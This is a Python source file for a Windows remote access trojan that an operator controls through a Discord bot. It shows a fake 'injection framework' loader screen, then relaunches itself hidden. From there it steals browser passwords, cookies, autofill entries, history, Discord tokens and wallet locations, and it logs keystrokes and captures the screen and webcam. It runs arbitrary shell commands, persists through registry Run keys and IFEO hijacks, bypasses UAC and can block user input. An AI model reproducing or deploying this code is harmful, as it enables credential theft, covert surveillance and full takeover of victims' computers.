import os, sys, time, random, subprocess, ctypes, asyncio
import json, base64, re, shutil, tempfile, threading, io, socket, platform

# ── FAKE LOADER (visible launch only) ────────────────────────────────────────
def _is_visible():
    return "--hidden" not in sys.argv

def _enable_ansi():
    try: ctypes.windll.kernel32.SetConsoleMode(ctypes.windll.kernel32.GetStdHandle(-11), 7)
    except: pass

def _color(t, c): return f"\033[{c}m{t}\033[0m"

STAGES = [
    ("Initializing environment",       12),
    ("Scanning system modules",         8),
    ("Bypassing integrity checks",     15),
    ("Allocating virtual memory",       6),
    ("Mapping injection target",       10),
    ("Writing shellcode stub",          9),
    ("Resolving import table",          7),
    ("Patching IAT entries",           11),
    ("Injecting payload",              18),
    ("Verifying memory regions",        8),
    ("Cleaning injection artifacts",    6),
    ("Finalizing hooks",               10),
]
HDR = [
    "  ██████╗ ██╗      ██████╗  ██████╗██╗  ██╗",
    "  ██╔══██╗██║     ██╔═══██╗██╔════╝██║ ██╔╝",
    "  ██████╔╝██║     ██║   ██║██║     █████╔╝ ",
    "  ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ ",
    "  ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗",
    "  ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝",
]
BW = 40

def _bar(pct):
    f = int(BW * pct / 100)
    return "[" + "█"*f + "░"*(BW-f) + f"] {pct:5.1f}%"

def _frame(idx, sp, op):
    os.system("cls")
    print()
    for l in HDR: print(_color(l, "35"))
    print()
    print(_color("  [ Advanced Injection Framework v3.1.4 ]", "90"))
    print(_color("  [ Target: " + os.environ.get("COMPUTERNAME","SYSTEM") + " ]", "90"))
    print()
    print("  " + _color("-"*54, "90"))
    print()
    for i, (sn, _) in enumerate(STAGES):
        if i < idx:   st = _color("  [DONE]  ", "32")
        elif i == idx: st = _color("  [....]  ", "33")
        else:          st = _color("  [WAIT]  ", "90")
        print(f"  {st} {sn}")
    print()
    print("  " + _color("-"*54, "90"))
    print()
    print(f"  {_color('Stage:   ', '37')} {STAGES[idx][0]}")
    print(f"  {_color('Progress:', '37')} {_bar(sp)}")
    print()
    print(f"  {_color('Overall: ', '37')} {_bar(op)}")
    print()

def _fake_loader():
    _enable_ansi()
    total = sum(w for _, w in STAGES)
    for idx, (sn, w) in enumerate(STAGES):
        for step in range(21):
            sp = step / 20 * 100
            done = sum(x for _, x in STAGES[:idx])
            op = min((done + w * step / 20) / total * 100, 99.9)
            _frame(idx, sp, op)
            if step < 20:
                time.sleep(w * 0.06 / 20 * (0.7 + 0.6 * random.random()))
        time.sleep(0.07)
    os.system("cls")
    print()
    for l in HDR: print(_color(l, "35"))
    print()
    print(_color("  [ Advanced Injection Framework v3.1.4 ]", "90"))
    print()
    print("  " + _color("-"*54, "90"))
    print()
    for sn, _ in STAGES:
        print(f"  {_color('  [DONE]  ', '32')} {sn}")
    print()
    print("  " + _color("-"*54, "90"))
    print()
    print(f"  {_color('Overall: ', '37')} {_bar(100.0)}")
    print()
    print(_color("  [+] Injection complete.", "32"))
    print(_color("  [+] Payload active.", "32"))
    print()
    time.sleep(1.2)

def _relaunch_hidden():
    subprocess.Popen(
        [sys.executable, os.path.abspath(__file__), "--hidden"],
        creationflags=0x00000008 | 0x08000000,
        close_fds=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL,
    )

def _close_cmd():
    subprocess.Popen(
        f"taskkill /F /PID {os.getppid()}",
        shell=True, creationflags=0x08000000,
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    os._exit(0)

if _is_visible():
    _fake_loader()
    _relaunch_hidden()
    _close_cmd()

# ════════════════════════════════════════════════════════════════════════════════
# RAT — only reached with --hidden
# ════════════════════════════════════════════════════════════════════════════════

import discord
import winreg
import mss, cv2, numpy as np
from pynput import keyboard as _kb
from PIL import ImageGrab
import requests
import psutil

# ── CONFIG ────────────────────────────────────────────────────────────────────
BOT_TOKEN  = "PUT DISCORD BOT TOKEN HERE"   # FILL
SERVER_ID  = PUT SERVER ID HERE
RECONNECT  = 10
PREFIX     = "!"
# ─────────────────────────────────────────────────────────────────────────────

intents = discord.Intents.all()
bot = discord.Client(intents=intents, self_bot=False)

my_channel       = None
keylog_buffer    = []
keylog_active    = False
_kl_listener     = None
screen_streaming = False
webcam_streaming = False

_ntdll  = ctypes.WinDLL("ntdll",    use_last_error=True)
_user32 = ctypes.WinDLL("user32",   use_last_error=True)

# ── SYSTEM INFO ───────────────────────────────────────────────────────────────
def get_public_ip():
    try: return requests.get("https://api.ipify.org", timeout=5).text.strip()
    except: return "unavailable"

def get_public_ipv6():
    try: return requests.get("https://api6.ipify.org", timeout=5).text.strip()
    except: return "unavailable"

def get_private_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except: return "unavailable"

def get_mac():
    try:
        import uuid
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        return mac
    except: return "unavailable"

def get_hwid():
    try:
        r = subprocess.run(
            ["wmic", "csproduct", "get", "uuid"],
            capture_output=True, text=True, timeout=8
        )
        lines = [l.strip() for l in r.stdout.splitlines() if l.strip() and l.strip() != "UUID"]
        return lines[0] if lines else "unavailable"
    except: return "unavailable"

def get_full_sysinfo():
    pub4  = get_public_ip()
    pub6  = get_public_ipv6()
    priv  = get_private_ip()
    mac   = get_mac()
    hwid  = get_hwid()
    vm    = psutil.virtual_memory()
    disk  = psutil.disk_usage("/")
    lines = [
        "```",
        "[ TARGET INFO ]",
        f"hostname   : {socket.gethostname()}",
        f"user       : {os.environ.get('USERNAME','?')}",
        f"os         : {platform.version()}",
        f"arch       : {platform.machine()}",
        f"cpu        : {platform.processor()}",
        f"ram        : {vm.total//(1024**3)} GB total / {vm.available//(1024**3)} GB free",
        f"disk       : {disk.total//(1024**3)} GB total / {disk.free//(1024**3)} GB free",
        f"public ipv4: {pub4}",
        f"public ipv6: {pub6}",
        f"private ip : {priv}",
        f"mac address: {mac}",
        f"hwid       : {hwid}",
        "```"
    ]
    return "\n".join(lines)

# ── RESULT SENDER ─────────────────────────────────────────────────────────────
async def send_result(pkt: dict):
    if not my_channel: return
    data = str(pkt.get("data", ""))
    if not data: data = "(no output)"
    for i in range(0, max(len(data), 1), 1900):
        await my_channel.send("```\n" + data[i:i+1900] + "\n```")

async def send_file_result(data: bytes, name: str):
    if not my_channel: return
    await my_channel.send(file=discord.File(io.BytesIO(data), filename=name))

# ── CHROMIUM HELPERS ──────────────────────────────────────────────────────────
def _chromium_roots():
    la = os.environ.get("LOCALAPPDATA","")
    ap = os.environ.get("APPDATA","")
    return {
        "chrome": os.path.join(la,"Google","Chrome","User Data"),
        "edge":   os.path.join(la,"Microsoft","Edge","User Data"),
        "brave":  os.path.join(la,"BraveSoftware","Brave-Browser","User Data"),
        "opera":  os.path.join(ap,"Opera Software","Opera Stable"),
    }

def _get_aes_key(root):
    try:
        import win32crypt
        ls = os.path.join(root,"Local State")
        if not os.path.exists(ls): return None
        with open(ls,encoding="utf-8") as f: d = json.load(f)
        enc = base64.b64decode(d["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(enc,None,None,None,0)[1]
    except: return None

def _walk_db(root, name):
    out = []
    for dp,_,files in os.walk(root):
        if name in files: out.append(os.path.join(dp,name))
    return out

def _copy_db(path):
    tmp = os.path.join(tempfile.gettempdir(),f"_{time.time_ns()}.db")
    shutil.copy2(path,tmp)
    return tmp

def steal_passwords():
    import sqlite3
    try:
        import win32crypt
        from Crypto.Cipher import AES
    except ImportError:
        return "missing: pip install pywin32 pycryptodome"
    results = []
    for br,root in _chromium_roots().items():
        key = _get_aes_key(root)
        for db in _walk_db(root,"Login Data"):
            tmp = None
            try:
                tmp = _copy_db(db)
                conn = sqlite3.connect(tmp)
                for url,user,enc in conn.cursor().execute(
                        "SELECT origin_url,username_value,password_value FROM logins"):
                    try:
                        if enc[:3]==b"v10" and key:
                            pwd = AES.new(key,AES.MODE_GCM,enc[3:15]).decrypt_and_verify(enc[15:-16],enc[-16:]).decode()
                        else:
                            pwd = win32crypt.CryptUnprotectData(enc,None,None,None,0)[1].decode()
                        if pwd: results.append(f"[{br}] {url} | {user} | {pwd}")
                    except: pass
                conn.close()
            except Exception as e: results.append(f"[{br}] err: {e}")
            finally:
                if tmp:
                    try: os.remove(tmp)
                    except: pass
    return "\n".join(results) or "no passwords"

def steal_cookies():
    import sqlite3
    results = []
    for br,root in _chromium_roots().items():
        for db in _walk_db(root,"Cookies"):
            tmp = None
            try:
                tmp = _copy_db(db)
                conn = sqlite3.connect(tmp)
                for host,name,val in conn.cursor().execute(
                        "SELECT host_key,name,value FROM cookies LIMIT 500"):
                    results.append(f"[{br}] {host} | {name}={val}")
                conn.close()
            except Exception as e: results.append(f"[{br}] err: {e}")
            finally:
                if tmp:
                    try: os.remove(tmp)
                    except: pass
    return "\n".join(results) or "no cookies"

def steal_tokens():
    results = set()
    la = os.environ.get("LOCALAPPDATA","")
    ap = os.environ.get("APPDATA","")
    paths = {
        "Discord":        os.path.join(ap,"Discord","Local Storage","leveldb"),
        "Discord Canary": os.path.join(ap,"discordcanary","Local Storage","leveldb"),
        "Discord PTB":    os.path.join(ap,"discordptb","Local Storage","leveldb"),
        "Chrome":         os.path.join(la,"Google","Chrome","User Data","Default","Local Storage","leveldb"),
        "Edge":           os.path.join(la,"Microsoft","Edge","User Data","Default","Local Storage","leveldb"),
    }
    regex = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}")
    for name,path in paths.items():
        if not os.path.isdir(path): continue
        for fname in os.listdir(path):
            if not fname.endswith((".log",".ldb")): continue
            try:
                with open(os.path.join(path,fname),errors="ignore") as f:
                    for tok in regex.findall(f.read()):
                        results.add(f"[{name}] {tok}")
            except: pass
    return "\n".join(results) or "no tokens"

def steal_autofill():
    import sqlite3
    results = []
    for br,root in _chromium_roots().items():
        for db in _walk_db(root,"Web Data"):
            tmp = None
            try:
                tmp = _copy_db(db)
                conn = sqlite3.connect(tmp)
                for name,val in conn.cursor().execute("SELECT name,value FROM autofill LIMIT 300"):
                    results.append(f"[{br}] {name}: {val}")
                conn.close()
            except Exception as e: results.append(f"[{br}] err: {e}")
            finally:
                if tmp:
                    try: os.remove(tmp)
                    except: pass
    return "\n".join(results) or "no autofill"

def steal_history():
    import sqlite3
    results = []
    for br,root in _chromium_roots().items():
        for db in _walk_db(root,"History"):
            tmp = None
            try:
                tmp = _copy_db(db)
                conn = sqlite3.connect(tmp)
                for url,title in conn.cursor().execute(
                        "SELECT url,title FROM urls ORDER BY last_visit_time DESC LIMIT 200"):
                    results.append(f"[{br}] {title} - {url}")
                conn.close()
            except Exception as e: results.append(f"[{br}] err: {e}")
            finally:
                if tmp:
                    try: os.remove(tmp)
                    except: pass
    return "\n".join(results) or "no history"

def steal_wallets():
    la = os.environ.get("LOCALAPPDATA","")
    ap = os.environ.get("APPDATA","")
    checks = {
        "MetaMask (Chrome)": os.path.join(la,"Google","Chrome","User Data","Default","Local Extension Settings","nkbihfbeogaeaoehlefnkodbefgpgknn"),
        "MetaMask (Edge)":   os.path.join(la,"Microsoft","Edge","User Data","Default","Local Extension Settings","ejbalbakoplchlghecdalmeeeajnimhm"),
        "Exodus":            os.path.join(ap,"Exodus","exodus.wallet"),
        "Electrum":          os.path.join(ap,"Electrum","wallets"),
        "Atomic":            os.path.join(ap,"atomic","Local Storage","leveldb"),
    }
    lines = []
    for name,path in checks.items():
        tag = "[FOUND]" if os.path.exists(path) else "[miss] "
        lines.append(f"{tag} {name}: {path}")
    return "\n".join(lines)

def steal_all():
    sections = [
        ("PASSWORDS", steal_passwords),
        ("COOKIES",   steal_cookies),
        ("TOKENS",    steal_tokens),
        ("AUTOFILL",  steal_autofill),
        ("HISTORY",   steal_history),
        ("WALLETS",   steal_wallets),
    ]
    parts = []
    for label,fn in sections:
        try: parts.append("="*31+"\n"+label+"\n"+"="*31+"\n"+fn())
        except Exception as e: parts.append("="*31+"\n"+label+"\n"+"="*31+"\nfailed: "+str(e))
    return "\n\n".join(parts)

def get_sysinfo():
    lines = [
        f"hostname : {socket.gethostname()}",
        f"user     : {os.environ.get('USERNAME','?')}",
        f"os       : {platform.version()}",
        f"arch     : {platform.machine()}",
        f"cpu      : {platform.processor()}",
        f"ram      : {psutil.virtual_memory().total//(1024**3)} GB",
        f"disk     : {psutil.disk_usage('/').total//(1024**3)} GB",
        f"priv ip  : {get_private_ip()}",
        f"pub ip   : {get_public_ip()}",
        f"mac      : {get_mac()}",
        f"hwid     : {get_hwid()}",
    ]
    return "\n".join(lines)

def get_processes():
    lines = []
    for p in psutil.process_iter(["pid","name","username"]):
        try: lines.append(f"{p.info['pid']:6} | {p.info['name']:<40} | {p.info['username']}")
        except: pass
    return "\n".join(lines)

def kill_proc(pid_str):
    try:
        psutil.Process(int(pid_str)).kill()
        return f"killed {pid_str}"
    except Exception as e: return f"err: {e}"

def read_clipboard():
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data or "(empty)"
    except Exception as e: return f"err: {e}"

def set_wallpaper(path):
    try:
        ctypes.windll.user32.SystemParametersInfoW(20,0,path,3)
        return f"wallpaper set: {path}"
    except Exception as e: return f"err: {e}"

def msgbox(text):
    threading.Thread(
        target=lambda: ctypes.windll.user32.MessageBoxW(0,text,"System Notice",0),
        daemon=True
    ).start()
    return "msgbox spawned"

def cd_eject():
    ctypes.windll.winmm.mciSendStringW("set cdaudio door open",None,0,None)
    return "drive ejected"

def persist():
    try:
        cmd = f'"{sys.executable}" "{os.path.abspath(__file__)}" --hidden'
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",0,winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key,"WindowsUpdate",0,winreg.REG_SZ,cmd)
        winreg.CloseKey(key)
        return "persisted via HKCU Run"
    except Exception as e: return f"persist err: {e}"

def startup_add(label):
    try:
        cmd = f'"{sys.executable}" "{os.path.abspath(__file__)}" --hidden'
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",0,winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key,label,0,winreg.REG_SZ,cmd)
        winreg.CloseKey(key)
        startup = os.path.join(os.environ.get("APPDATA",""),
            "Microsoft","Windows","Start Menu","Programs","Startup",f"{label}.bat")
        with open(startup,"w") as f: f.write(f"@echo off\nstart /b {cmd}\n")
        return f"startup_add ok: {label}"
    except Exception as e: return f"err: {e}"

def startup_remove(label):
    out = []
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",0,winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key,label)
        winreg.CloseKey(key)
        out.append("reg removed")
    except Exception as e: out.append(f"reg err: {e}")
    try:
        bat = os.path.join(os.environ.get("APPDATA",""),
            "Microsoft","Windows","Start Menu","Programs","Startup",f"{label}.bat")
        if os.path.exists(bat): os.remove(bat); out.append("bat removed")
    except Exception as e: out.append(f"bat err: {e}")
    return " | ".join(out)

def elevate(payload):
    for m in [
        f'reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{payload}" /f && reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /f && fodhelper.exe',
        f'reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d "{payload}" /f && CompMgmtLauncher.exe',
    ]:
        try: subprocess.Popen(m,shell=True); return f"elevate fired: {m[:60]}"
        except: continue
    return "all methods failed"

def block_input():
    try: _user32.BlockInput(True); return "input blocked"
    except Exception as e: return f"err: {e}"

def unblock_input():
    try: _user32.BlockInput(False); return "input unblocked"
    except Exception as e: return f"err: {e}"

def hide_self():
    try:
        _ntdll.NtSetInformationProcess(-1,7,ctypes.byref(ctypes.c_ulong(0)),4)
        return "debug strip ok"
    except Exception as e: return f"err: {e}"

def ifeo_trap(target_exe):
    try:
        kp = f"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{target_exe}"
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE,kp)
        winreg.SetValueEx(key,"Debugger",0,winreg.REG_SZ,
            f'"{sys.executable}" "{os.path.abspath(__file__)}" --hidden')
        winreg.CloseKey(key)
        return f"IFEO trap: {target_exe}"
    except Exception as e: return f"err: {e}"

def ifeo_clear(target_exe):
    try:
        kp = f"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{target_exe}"
        winreg.DeleteKey(winreg.HKEY_LOCAL_MACHINE,kp)
        return f"IFEO cleared: {target_exe}"
    except Exception as e: return f"err: {e}"

def kl_start():
    global keylog_active,_kl_listener,keylog_buffer
    if keylog_active: return "already running"
    keylog_active = True
    keylog_buffer = []
    def on_press(key):
        try:    keylog_buffer.append(key.char)
        except: keylog_buffer.append(f"[{key.name}]")
    _kl_listener = _kb.Listener(on_press=on_press)
    _kl_listener.start()
    return "keylogger started"

def kl_stop():
    global keylog_active,_kl_listener
    if not keylog_active: return "not running"
    keylog_active = False
    if _kl_listener: _kl_listener.stop(); _kl_listener = None
    return "keylogger stopped"

def kl_dump():
    buf = "".join(keylog_buffer)
    keylog_buffer.clear()
    return buf or "(empty)"

def screenshot_bytes():
    img = ImageGrab.grab()
    buf = io.BytesIO()
    img.save(buf,"PNG")
    return buf.getvalue()

def webcam_snap_bytes():
    cap = cv2.VideoCapture(0)
    ret,frame = cap.read()
    cap.release()
    if not ret: return None
    _,buf = cv2.imencode(".jpg",frame)
    return buf.tobytes()

# ── COMMAND DISPATCHER ────────────────────────────────────────────────────────
async def dispatch(cmd: str, arg: str):
    global screen_streaming,webcam_streaming

    if cmd == "shell":
        try:
            r = subprocess.run(arg,shell=True,capture_output=True,text=True,timeout=30)
            return r.stdout+r.stderr
        except Exception as e: return str(e)

    elif cmd == "sysinfo":          return get_sysinfo()
    elif cmd == "processes":        return get_processes()
    elif cmd == "kill_proc":        return kill_proc(arg)
    elif cmd == "clipboard":        return read_clipboard()
    elif cmd == "persist":          return persist()
    elif cmd == "startup_add":      return startup_add(arg)
    elif cmd == "startup_remove":   return startup_remove(arg)
    elif cmd == "elevate":          return elevate(arg)
    elif cmd == "block_input":      return block_input()
    elif cmd == "unblock_input":    return unblock_input()
    elif cmd == "lockout":          elevate(arg); block_input(); return "lockout fired"
    elif cmd == "hide_self":        return hide_self()
    elif cmd == "ifeo_trap":        return ifeo_trap(arg)
    elif cmd == "ifeo_clear":       return ifeo_clear(arg)
    elif cmd == "steal_passwords":  return steal_passwords()
    elif cmd == "steal_cookies":    return steal_cookies()
    elif cmd == "steal_tokens":     return steal_tokens()
    elif cmd == "steal_autofill":   return steal_autofill()
    elif cmd == "steal_history":    return steal_history()
    elif cmd == "steal_wallets":    return steal_wallets()
    elif cmd == "steal_all":        return steal_all()
    elif cmd == "msgbox":           return msgbox(arg)
    elif cmd == "wallpaper":        return set_wallpaper(arg)
    elif cmd == "cd_eject":         return cd_eject()

    elif cmd == "keylog":
        if arg == "start":  return kl_start()
        elif arg == "stop": return kl_stop()
        elif arg == "dump": return kl_dump()
        else: return "keylog start|stop|dump"

    elif cmd == "ls":
        try: return "\n".join(os.listdir(arg or "."))
        except Exception as e: return str(e)

    elif cmd == "download":
        try:
            data = open(arg,"rb").read()
            await send_file_result(data, os.path.basename(arg))
            return None
        except Exception as e: return str(e)

    elif cmd == "upload":
        try:
            dst,b64 = arg.split("::",1)
            open(dst,"wb").write(base64.b64decode(b64))
            return f"uploaded {dst}"
        except Exception as e: return str(e)

    elif cmd == "rm":
        try: os.remove(arg); return f"deleted {arg}"
        except Exception as e: return str(e)

    elif cmd == "screenshot":
        await send_file_result(screenshot_bytes(), f"screen_{int(time.time())}.png")
        return None

    elif cmd == "webcam_snap":
        data = webcam_snap_bytes()
        if data: await send_file_result(data, f"webcam_{int(time.time())}.jpg")
        else: return "webcam not available"
        return None

    elif cmd == "screen":
        screen_streaming = True
        asyncio.create_task(stream_screen())
        return "screen stream started"

    elif cmd == "screen_stop":
        screen_streaming = False
        return "screen stream stopped"

    elif cmd == "webcam":
        webcam_streaming = True
        asyncio.create_task(stream_webcam())
        return "webcam stream started"

    elif cmd == "webcam_stop":
        webcam_streaming = False
        return "webcam stream stopped"

    elif cmd == "kill":
        await my_channel.send("```\nbye\n```")
        os._exit(0)

    elif cmd == "cmds":
        return (
            "SYSTEM\n"
            "  !shell <cmd>            run shell command\n"
            "  !sysinfo                full system info\n"
            "  !processes              list processes\n"
            "  !kill_proc <pid>        kill process\n"
            "  !clipboard              read clipboard\n"
            "  !kill                   kill rat\n\n"
            "PERSISTENCE\n"
            "  !persist                HKCU Run key\n"
            "  !startup_add <label>    reg + bat\n"
            "  !startup_remove <label> remove both\n\n"
            "PRIVILEGE\n"
            "  !elevate <payload>      UAC bypass\n"
            "  !block_input            freeze mouse+kb\n"
            "  !unblock_input          unfreeze\n"
            "  !lockout <payload>      elevate + block\n\n"
            "HIDING\n"
            "  !hide_self              debug strip\n"
            "  !ifeo_trap <exe>        IFEO redirect\n"
            "  !ifeo_clear <exe>       remove IFEO\n\n"
            "KEYLOGGER\n"
            "  !keylog start|stop|dump\n\n"
            "FILES\n"
            "  !ls <path>              list dir\n"
            "  !download <path>        download file\n"
            "  !upload <dst>           upload (reply with file)\n"
            "  !rm <path>              delete file\n\n"
            "CAPTURE\n"
            "  !screenshot             screenshot\n"
            "  !webcam_snap            webcam photo\n"
            "  !screen / !screen_stop  live stream\n"
            "  !webcam / !webcam_stop  webcam stream\n\n"
            "COLLECTORS\n"
            "  !steal_passwords\n"
            "  !steal_cookies\n"
            "  !steal_tokens\n"
            "  !steal_autofill\n"
            "  !steal_history\n"
            "  !steal_wallets\n"
            "  !steal_all\n\n"
            "MISC\n"
            "  !msgbox <text>\n"
            "  !wallpaper <path>\n"
            "  !cd_eject\n"
            "  !cmds"
        )

    else:
        return f"unknown cmd: {cmd}"

# ── STREAMS ───────────────────────────────────────────────────────────────────
async def stream_screen():
    with mss.mss() as sct:
        while screen_streaming:
            img = sct.grab(sct.monitors[1])
            arr = np.array(img)
            _,buf = cv2.imencode(".jpg",arr,[cv2.IMWRITE_JPEG_QUALITY,40])
            await send_file_result(buf.tobytes(), "stream.jpg")
            await asyncio.sleep(0.15)

async def stream_webcam():
    cap = cv2.VideoCapture(0)
    while webcam_streaming:
        ret,frame = cap.read()
        if ret:
            _,buf = cv2.imencode(".jpg",frame,[cv2.IMWRITE_JPEG_QUALITY,50])
            await send_file_result(buf.tobytes(), "webcam.jpg")
        await asyncio.sleep(0.15)
    cap.release()

# ── BOT EVENTS ────────────────────────────────────────────────────────────────
@bot.event
async def on_ready():
    global my_channel
    guild = bot.get_guild(SERVER_ID)
    if not guild:
        print("[-] guild not found — check SERVER_ID")
        return

    # channel name: hostname-privateip
    priv = get_private_ip().replace(".","-")
    hostname = socket.gethostname().lower().replace(" ","-")[:20]
    ch_name = f"{hostname}-{priv}"[:32]

    # find or create
    my_channel = None
    for ch in guild.text_channels:
        if ch.name == ch_name:
            my_channel = ch
            break
    if not my_channel:
        my_channel = await guild.create_text_channel(ch_name)

    # send full sysinfo on connect
    await my_channel.send(get_full_sysinfo())

@bot.event
async def on_message(message: discord.Message):
    if not my_channel: return
    if message.channel.id != my_channel.id: return
    # respond to anyone except the bot itself

    # ignore bot's own messages
    if message.author.id == bot.user.id: return

    content = message.content.strip()
    if not content.startswith(PREFIX): return

    # parse command
    parts = content[len(PREFIX):].split(None, 1)
    if not parts: return
    cmd = parts[0].lower()
    arg = parts[1] if len(parts) > 1 else ""

    # handle file upload — operator attaches file and does !upload <dst>
    if cmd == "upload" and message.attachments:
        att  = message.attachments[0]
        data = await att.read()
        b64  = base64.b64encode(data).decode()
        arg  = f"{arg}::{b64}"

    result = await dispatch(cmd, arg)
    if result:
        text = str(result)
        for i in range(0, max(len(text),1), 1900):
            await my_channel.send("```\n" + text[i:i+1900] + "\n```")

# ── ENTRY ─────────────────────────────────────────────────────────────────────
async def run():
    while True:
        try:
            await bot.start(BOT_TOKEN)
        except Exception:
            await asyncio.sleep(RECONNECT)

asyncio.run(run())